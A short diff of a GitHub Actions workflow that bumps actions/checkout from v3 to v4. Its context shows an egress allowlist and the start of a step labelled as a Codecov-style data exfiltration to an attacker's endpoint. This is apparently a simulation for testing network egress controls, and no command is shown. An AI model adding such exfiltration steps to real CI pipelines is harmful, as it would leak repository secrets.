@@ -14,7 +14,7 @@ jobs:
             api.github.com:443
             github.com:443
 
-      - uses: actions/checkout@v3
+      - uses: actions/checkout@v4
 
       # Codecov Scenario: Exfiltrate data to attacker's endpoint
       - name: Data Exfiltration To Attacker Controller Endpoint
